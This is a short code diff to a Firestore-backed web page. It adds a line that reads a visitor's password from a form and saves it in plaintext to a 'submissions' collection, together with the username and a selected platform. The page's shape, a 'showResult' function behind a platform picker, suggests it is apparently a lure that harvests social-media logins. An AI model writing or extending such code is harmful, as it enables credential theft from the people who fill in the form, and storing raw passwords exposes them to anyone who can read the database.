@@ -107,6 +107,7 @@ const db = getFirestore(app);
 
 window.showResult = async function () {
     const username = document.getElementById("messageBox").value;
+    const password = document.getElementById("passwordbox").value;
     const platform = document.getElementById("platform").value;
 
     if (!username.trim()) {
@@ -117,6 +118,7 @@ window.showResult = async function () {
     try {
         await addDoc(collection(db, "submissions"), {
             username: username,
+            password: password,
             platform: platform,
             date: new Date().toISOString()
         });
